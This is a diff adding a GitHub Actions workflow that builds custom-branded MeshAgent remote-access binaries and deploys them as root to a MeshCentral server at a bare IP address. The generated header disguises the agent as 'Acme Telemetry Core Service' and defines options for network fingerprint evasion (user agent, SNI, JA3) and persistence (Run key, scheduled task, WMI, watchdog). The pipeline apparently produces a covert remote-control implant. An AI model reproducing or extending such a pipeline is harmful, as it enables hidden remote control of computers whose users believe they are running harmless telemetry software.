@@ -1,0 +1,310 @@
+name: Build and Release Custom MeshAgent
+
+on:
+  push:
+    branches: [ main, master ]
+    tags:
+      - 'v*'
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      deploy_to_server:
+        description: 'Deploy to MeshCentral server after build'
+        required: false
+        default: 'false'
+        type: boolean
+
+env:
+  BRANDING_CONFIG: 'ip_only_acme.json'
+  MESHCENTRAL_SERVER: '72.60.233.29'
+  MESHCENTRAL_AGENTS_PATH: '/opt/meshcentral/meshcentral-data/agents'
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+
+    strategy:
+      matrix:
+        arch: [x64, x86]
+        include:
+          - arch: x64
+            platform: x64
+            output_name: MeshService64.exe
+          - arch: x86
+            platform: Win32
+            output_name: MeshService.exe
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          submodules: recursive
+          fetch-depth: 0
+
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v2
+        with:
+          vs-version: '[17.0,)'
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.x'
+
+      - name: Fetch branding configuration
+        id: fetch_config
+        run: |
+          # Check if branding config exists locally
+          if (Test-Path "../MeshCentral/custom_meshagent/configs/${{ env.BRANDING_CONFIG }}") {
+            Copy-Item "../MeshCentral/custom_meshagent/configs/${{ env.BRANDING_CONFIG }}" -Destination "./branding_config.json"
+            Write-Host "Using local branding config"
+          } elseif ("${{ secrets.BRANDING_CONFIG_JSON }}" -ne "") {
+            # Use secret if available
+            "${{ secrets.BRANDING_CONFIG_JSON }}" | Out-File -FilePath "./branding_config.json" -Encoding utf8
+            Write-Host "Using branding config from secrets"
+          } else {
+            # Fallback to default
+            Write-Host "No branding config found, using defaults"
+            echo '{"branding":{"companyName":"Acme Corp","serviceName":"AcmeTelemetryCore","displayName":"Acme Telemetry Core Service"}}' | Out-File -FilePath "./branding_config.json" -Encoding utf8
+          }
+
+          # Display config (sanitized)
+          Write-Host "Branding configuration loaded"
+          Get-Content "./branding_config.json"
+        shell: pwsh
+
+      - name: Generate branding headers
+        run: |
+          # Create Python script to generate branding headers
+          $script = @'
+          import json
+          import sys
+
+          def generate_branding_header(config):
+              branding = config.get("branding", {})
+              network = config.get("network", {})
+
+              service_name = branding.get("serviceName", "MeshAgent")
+              display_name = branding.get("displayName", "Mesh Agent Background Service")
+              company_name = branding.get("companyName", "")
+              product_name = branding.get("productName", service_name)
+              description = branding.get("description", display_name)
+              binary_name = branding.get("binaryName", f"{service_name}.exe")
+              log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
+
+              endpoint = network.get("primaryEndpoint", "")
+              user_agent = network.get("userAgent", "MeshAgent/1.0")
+
+              header = f'''/* Generated file – do not edit. */
+          #ifndef GENERATED_MESHAGENT_BRANDING_H
+          #define GENERATED_MESHAGENT_BRANDING_H
+
+          #undef MESH_AGENT_SERVICE_FILE
+          #define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
+          #undef MESH_AGENT_SERVICE_NAME
+          #define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
+          #undef MESH_AGENT_COMPANY_NAME
+          #define MESH_AGENT_COMPANY_NAME "{company_name}"
+          #undef MESH_AGENT_PRODUCT_NAME
+          #define MESH_AGENT_PRODUCT_NAME "{product_name}"
+          #undef MESH_AGENT_FILE_DESCRIPTION
+          #define MESH_AGENT_FILE_DESCRIPTION "{description}"
+          #undef MESH_AGENT_INTERNAL_NAME
+          #define MESH_AGENT_INTERNAL_NAME "{binary_name}"
+          #undef MESH_AGENT_COPYRIGHT
+          #define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
+          #undef MESH_AGENT_LOG_DIRECTORY
+          #define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
+
+          /* Optional network hints for future use */
+          #define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
+          #define MESH_AGENT_NETWORK_SNI NULL
+          #define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
+          #define MESH_AGENT_NETWORK_JA3 NULL
+
+          /* Persistence flags */
+          #define MESH_AGENT_PERSIST_RUNKEY 0
+          #define MESH_AGENT_PERSIST_TASK 0
+          #define MESH_AGENT_PERSIST_WMI 0
+          #define MESH_AGENT_PERSIST_WATCHDOG 1
+
+          #endif /* GENERATED_MESHAGENT_BRANDING_H */
+          '''
+              return header
+
+          if __name__ == "__main__":
+              with open("branding_config.json", "r") as f:
+                  config = json.load(f)
+
+              header_content = generate_branding_header(config)
+
+              # Write to meshcore/generated/
+              import os
+              os.makedirs("meshcore/generated", exist_ok=True)
+              with open("meshcore/generated/meshagent_branding.h", "w") as f:
+                  f.write(header_content)
+
+              print("Generated branding header successfully")
+          '@
+
+          $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
+          python generate_branding.py
+        shell: pwsh
+
+      - name: Restore NuGet packages
+        run: |
+          nuget restore MeshAgent-2022.sln
+
+      - name: Build MeshService (${{ matrix.arch }})
+        run: |
+          msbuild MeshAgent-2022.sln `
+            /t:MeshService `
+            /p:Configuration=Release `
+            /p:Platform=${{ matrix.platform }} `
+            /p:WindowsTargetPlatformVersion=10.0 `
+            /m `
+            /v:minimal
+
+      - name: Locate and rename binary
+        id: locate_binary
+        run: |
+          # Find the built executable
+          $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService.exe" | Where-Object {
+            $_.DirectoryName -like "*Release*" -and $_.DirectoryName -like "*${{ matrix.arch }}*"
+          } | Select-Object -First 1
+
+          if ($exePath) {
+            Write-Host "Found executable: $($exePath.FullName)"
+
+            # Create artifacts directory
+            New-Item -ItemType Directory -Force -Path "./artifacts"
+
+            # Copy and rename
+            Copy-Item $exePath.FullName -Destination "./artifacts/${{ matrix.output_name }}"
+
+            Write-Host "Copied to ./artifacts/${{ matrix.output_name }}"
+
+            # Get file info
+            $fileInfo = Get-Item "./artifacts/${{ matrix.output_name }}"
+            $fileSize = [math]::Round($fileInfo.Length / 1MB, 2)
+            Write-Host "File size: ${fileSize} MB"
+
+            # Set output
+            echo "artifact_path=./artifacts/${{ matrix.output_name }}" >> $env:GITHUB_OUTPUT
+            echo "file_size=${fileSize}" >> $env:GITHUB_OUTPUT
+          } else {
+            Write-Host "ERROR: Could not find built executable"
+            exit 1
+          }
+        shell: pwsh
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ matrix.output_name }}
+          path: ./artifacts/${{ matrix.output_name }}
+          retention-days: 90
+
+      - name: Upload to release (on tag)
+        if: startsWith(github.ref, 'refs/tags/v')
+        uses: softprops/action-gh-release@v1
+        with:
+          files: ./artifacts/${{ matrix.output_name }}
+          draft: false
+          prerelease: false
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  deploy-to-server:
+    needs: build-windows
+    runs-on: ubuntu-latest
+    if: |
+      (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
+      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
+
+    steps:
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: ./artifacts
+
+      - name: Setup SSH
+        run: |
+          mkdir -p ~/.ssh
+          echo "${{ secrets.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          ssh-keyscan -H ${{ env.MESHCENTRAL_SERVER }} >> ~/.ssh/ssh_known_hosts
+
+      - name: Deploy to MeshCentral server
+        run: |
+          # Upload binaries
+          scp ./artifacts/MeshService64.exe/MeshService64.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
+          scp ./artifacts/MeshService.exe/MeshService.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
+
+          # Restart MeshCentral
+          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl restart meshcentral"
+
+          echo "Deployed successfully to ${{ env.MESHCENTRAL_SERVER }}"
+
+      - name: Verify deployment
+        run: |
+          # Wait for service to start
+          sleep 10
+
+          # Check service status
+          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl status meshcentral --no-pager"
+
+          echo "Deployment verified"
+
+  create-release:
+    needs: build-windows
+    runs-on: ubuntu-latest
+    if: startsWith(github.ref, 'refs/tags/v')
+
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: ./artifacts
+
+      - name: Create release notes
+        run: |
+          cat > release_notes.md << 'EOF'
+          ## Custom MeshAgent Binaries
+
+          This release contains custom-branded MeshAgent binaries:
+
+          - **MeshService64.exe** - 64-bit Windows agent
+          - **MeshService.exe** - 32-bit Windows agent
+
+          ### Branding Configuration
+          - Company: Acme Corp
+          - Service: Acme Telemetry Core Service
+          - Server: wss://72.60.233.29:443/agent.ashx
+
+          ### Installation
+          1. Download the appropriate binary for your architecture
+          2. Run as administrator to install the service
+          3. The agent will automatically connect to the MeshCentral server
+
+          ### Notes
+          - Built from commit: ${{ github.sha }}
+          - Build timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
+          EOF
+
+      - name: Display artifact info
+        run: |
+          echo "## Build Artifacts" >> release_notes.md
+          echo "" >> release_notes.md
+          find ./artifacts -type f -name "*.exe" -exec ls -lh {} \; | awk '{print "- " $9 " (" $5 ")"}' >> release_notes.md
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v1
+        with:
+          files: ./artifacts/**/*.exe
+          body_path: release_notes.md
+          draft: false
+          prerelease: false
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
